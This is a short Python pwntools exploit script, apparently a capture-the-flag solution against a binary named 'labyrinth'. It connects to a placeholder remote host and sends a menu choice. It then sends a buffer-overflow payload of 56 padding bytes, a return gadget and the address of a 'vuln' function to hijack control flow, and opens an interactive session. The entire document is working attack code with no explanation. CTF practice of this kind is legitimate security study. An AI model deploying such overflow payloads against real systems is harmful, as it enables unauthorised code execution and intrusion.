from pwn import *

ret = p64(0x000401016)
vuln = p64(0x000401255)
#r = gdb.debug('./labyrinth', gdbscript='disas main')
r = remote('ip',port)


payload = b'A'*56 + ret + vuln
r.sendlineafter(b'>> ', b'069')
r.recvline()
r.sendlineafter(b'>> ', payload)

print(r.recv())

r.interactive()
